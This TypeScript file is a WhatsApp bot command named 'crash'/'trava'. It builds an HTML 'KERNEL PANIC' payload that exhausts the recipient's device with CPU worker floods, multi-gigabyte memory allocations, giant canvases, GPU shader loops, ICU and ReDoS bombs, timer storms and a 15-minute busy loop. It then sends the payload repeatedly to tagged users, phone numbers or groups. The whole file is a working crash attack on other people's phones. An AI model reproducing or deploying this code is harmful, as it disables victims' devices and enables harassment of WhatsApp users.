import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── payload ───────────────────────── */

function buildKernelPanic(name: string, lv: number) {
  const WK = 8 * lv;              // multiplicador de workers
  const CH = 512 * lv;            // MB por ArrayBuffer
  const N = 4 * lv;               // nº de ArrayBuffers
  const CVS = [16000, 12000, 8192]; // escalera de canvas
  const CNC = 1 + lv;
  const IMG = 6 * lv;
  const IMGSZ = 6000 + 3000 * lv;
  const ITER = 2000 + 1500 * lv;
  const BLUR = 300 + 200 * lv;
  const OCT = 8 + lv;
  const NORM = 2000000 * lv;
  const SORT = 60000 * lv;
  const DEEP = 30000;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
#g{position:absolute;z-index:20;left:0;right:0;top:0;background:rgba(0,0,0,.87);padding:10px;border-bottom:2px solid #0ff}
h2{margin:0 0 6px;color:#0ff;text-align:center;font-size:14px;letter-spacing:2px}
.st{display:flex;justify-content:space-between;font-size:10px;color:#9ff}
.st b{color:#0ff;font-size:14px}
#s{margin-top:5px;font-family:monospace;font-size:9px;color:#0ff;white-space:pre}
canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
#tv{position:absolute;inset:0;z-index:2;opacity:.5}
#bl{position:absolute;inset:0;z-index:3;filter:blur(${BLUR}px);background:radial-gradient(#0ff,#0055ff,#000);will-change:filter;animation:sp 2s linear infinite}
@keyframes sp{to{transform:rotate(360deg) scale(1.6)}}
</style>
<div id="g">
  <h2>☢️ KERNEL PANIC ☢️</h2>
  <div class="st"><div>NATIVO<br><b id="m">0</b></div><div>FPS<br><b id="f">0</b></div></div>
  <div id="s">init</div>
</div>
<div id="bl"></div>
<svg id="tv"></svg>
<canvas id="cv"></canvas>
<script>
var cv=document.getElementById('cv'),fEl=document.getElementById('f'),mEl=document.getElementById('m'),sEl=document.getElementById('s');
var keep=[],pool=[],fr=0,lf=0,mb=0;
function fase(n){try{sEl.textContent=n}catch(e){}}
function mbUp(n){mb+=n;try{mEl.textContent=mb}catch(e){}}

/* 0 · CPU: todos los núcleos, arranca antes de todo */
try{
  var wsrc='onmessage=function(){var a=new Float64Array(16384),v=1;while(true){for(var i=0;i<16384;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
  var wu=URL.createObjectURL(new Blob([wsrc],{type:'application/javascript'}));
  var wn=Math.max(6,(navigator.hardwareConcurrency||8)*${WK});
  for(var wi=0;wi<wn;wi++){try{var wk=new Worker(wu);wk.postMessage(1);pool.push(wk)}catch(e){}}
}catch(e){}

/* 1 · WASM: memoria lineal, tope 32767 páginas. Se pasa -> recarga silenciosa */
fase('wasm');
var ladder=[32768,24576,16384,8192];
for(var li=0;li<ladder.length;li++){
  try{
    var mem=new WebAssembly.Memory({initial:ladder[li],maximum:ladder[li]});
    new Uint8Array(mem.buffer).fill(1);
    keep.push(mem);
    mbUp(ladder[li]/16);
    break;
  }catch(e){}
}

/* 2 · ArrayBuffers, fill = memset */
fase('heap');
for(var b=0;b<${N};b++){
  try{
    var ab=new ArrayBuffer(${CH}*1048576);
    new Uint8Array(ab).fill(b+1);
    keep.push(ab);
    mbUp(${CH});
  }catch(e){try{sEl.textContent='tope '+mb+'MB'}catch(x){}break}
}

/* 3 · canvas gigantes, con escalera */
fase('canvas');
for(var c=0;c<${CNC};c++){
  for(var ci=0;ci<${CVS.length};ci++){
    var sz=${JSON.stringify(CVS)}[ci];
    try{
      var el=document.createElement('canvas');
      el.width=sz;el.height=sz;
      el.getContext('2d').fillRect(0,0,sz,sz);
      keep.push(el);
      mbUp(Math.round(sz*sz*4/1048576));
      break;
    }catch(e){}
  }
}

/* 4 · OffscreenCanvas extra */
fase('offscreen');
try{
  for(var o=0;o<${lv};o++){
    var oc=new OffscreenCanvas(8000,8000);
    oc.getContext('2d').fillRect(0,0,10,10);
    keep.push(oc);
    mbUp(244);
  }
}catch(e){}

/* 5 · bitmaps reescalados en hilo aparte */
fase('bitmap');
try{
  var sc=document.createElement('canvas');
  sc.width=700;sc.height=700;
  var sg=sc.getContext('2d'),sd=sg.createImageData(700,700);
  for(var p=0;p<sd.data.length;p+=4){sd.data[p]=Math.random()*255;sd.data[p+1]=Math.random()*255;sd.data[p+2]=Math.random()*255;sd.data[p+3]=255}
  sg.putImageData(sd,0,0);
  for(var k=0;k<${IMG};k++){
    if(window.createImageBitmap)createImageBitmap(sc,{resizeWidth:${IMGSZ},resizeHeight:${IMGSZ}})
      .then(function(bm){keep.push(bm);mbUp(Math.round(${IMGSZ}*${IMGSZ}*4/1048576))}).catch(function(){});
  }
}catch(e){}

/* 6 · ICU: normalización, mayúsculas y collator */
fase('icu');
try{
  var cm='\u034f'.repeat(${NORM});
  keep.push(cm.normalize('NFD'));
  keep.push(cm.normalize('NFC'));
  keep.push(cm.toLocaleUpperCase('tr'));
  var arr=[];
  for(var q=0;q<${SORT};q++)arr.push('\u00fc'+Math.random());
  var col=new Intl.Collator();
  arr.sort(col.compare);
  keep.push(arr);
}catch(e){}

/* 7 · clon profundo */
fase('clone');
try{
  var deep={v:'█'.repeat(3000)};
  for(var d=0;d<${DEEP};d++)deep={c:deep};
  keep.push(structuredClone(deep));
}catch(e){}

/* 8 · audio */
fase('audio');
try{
  var AC=window.AudioContext||window.webkitAudioContext;
  if(AC){
    var ac=new AC();
    for(var ao=0;ao<${40*lv};ao++){var os=ac.createOscillator();os.type='sawtooth';os.frequency.value=30+ao*4;os.connect(ac.destination);os.start()}
    for(var bu=0;bu<${6*lv};bu++){ac.createBuffer(2,48000*12,48000);mbUp(4)}
  }
}catch(e){}

/* 9 · SVG blur + turbulencia */
fase('svg');
try{
  var tv=document.getElementById('tv');
  tv.setAttribute('viewBox','0 0 420 420');
  tv.innerHTML='<defs><filter id="tb"><feGaussianBlur stdDeviation="${BLUR}"/>'+
    '<feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${OCT}" stitchTiles="stitch"/>'+
    '<feColorMatrix type="saturate" values="7"/></filter></defs><rect width="420" height="420" filter="url(#tb)"/>';
}catch(e){}

/* 10 · GPU: varios contextos con texturas 2048² */
fase('gpu');
try{
  cv.width=Math.min(window.innerWidth||420,760);
  cv.height=Math.min(window.innerHeight||900,1500);
  var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
  if(gl){
    gl.viewport(0,0,cv.width,cv.height);
    for(var t=0;t<${6*lv};t++){
      try{
        var tex=gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D,tex);
        gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,2048,2048,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
        gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR);
        mbUp(16);
      }catch(e){}
    }
    var vs=gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
    gl.compileShader(vs);
    var fs=gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.4;'+
      'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
      'for(int i=0;i<${ITER};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
      'if(dot(z,z)>4.)break;it++;}'+
      'float k=it/${ITER}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
    gl.compileShader(fs);
    var pr=gl.createProgram();
    gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
    var bf=gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER,bf);
    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
    var pos=gl.getAttribLocation(pr,'p');
    gl.enableVertexAttribArray(pos);
    gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
    var uT=gl.getUniformLocation(pr,'t'),uR=gl.getUniformLocation(pr,'r');
    (function loop(now){
      fr++;
      if(now-lf>=1000){try{fEl.textContent=fr}catch(e){}fr=0;lf=now}
      gl.uniform1f(uT,now*0.001);
      gl.uniform2f(uR,cv.width,cv.height);
      gl.drawArrays(gl.TRIANGLES,0,6);
      requestAnimationFrame(loop);
    })(0);
  }
}catch(e){}

/* 11 · layout thrash + tormenta de temporizadores */
fase('thrash');
try{
  var probe=document.createElement('div');
  probe.style.cssText='position:absolute;width:1px;height:1px';
  document.body.appendChild(probe);
  for(var th=0;th<${3000*lv};th++){
    probe.style.width=(th%50)+1+'px';
    probe.getBoundingClientRect();
    document.body.style.paddingTop=(th%2)+'px';
    document.body.offsetHeight;
  }
  for(var ti=0;ti<${60*lv};ti++)setInterval(function(){},0);
}catch(e){}

/* 12 · ReDoS determinista */
fase('redos '+mb+'MB');
try{ /^(a+)+$/.test('a'.repeat(38)+'!'); }catch(e){}
try{ /^(x+x+)+y$/.test('x'.repeat(38)+'!'); }catch(e){}
try{ /^(\w+\s?)+$/.test('ab '.repeat(45)+'!'); }catch(e){}
try{ /^(a|a)+$/.test('a'.repeat(40)+'!'); }catch(e){}

var t0=Date.now();
while(true){if(Date.now()-t0>900000)break}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── comando ───────────────────────── */

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  premiumOnly: true,
  description: "Kernel panic total: WASM 2GB, ArrayBuffers, canvas 16000², ICU, ReDoS, GPU y workers. Grupo = 1 tarjeta sin tags.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const mentioned: string[] = info.mentionedJid || [];
    const quoted: string | undefined = info.participant;
    const sender: string = (msg.key as any).participant || from;

    const raw = (args[0] || "").replace(/\D/g, "");
    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;

    let targets: string[];
    let priv: boolean;

    if (mentioned.length) { targets = mentioned; priv = true; }
    else if (raw.length >= 8) { targets = [`${raw}@s.whatsapp.net`]; priv = true; }
    else if (quoted) { targets = [quoted]; priv = true; }
    else { targets = [from]; priv = false; }

    await react("☢️").catch(() => undefined);

    const card = async (jid: string, name: string, level: number) => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("☢️ KERNEL PANIC // LuferOS")
        .setFooter(`nivel ${level} · ${level * 3} GB`);
      rich.addSection(buildKernelPanic(name, level));
      return rich.send(jid);
    };

    let ok = 0;
    const fail: string[] = [];

    for (const t of targets) {
      const isGroup = t.endsWith("@g.us");
      const num = t.split("@")[0].split(":")[0];

      let name = num;
      try {
        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
        else name = String((msg as any).pushName || "").trim() || num;
      } catch {}

      if (!priv) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        continue;
      }

      for (let i = 0; i < 4 + lv; i++) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        await sleep(220);
      }
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Kernel panic")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "grupo (1 tarjeta, sin tags)"}\n` +
        `Nivel ${lv} · ${ok} ok${fail.length ? ` · ${fail.length} fallos` : ""}`,
    ).catch(() => undefined);
  },
};
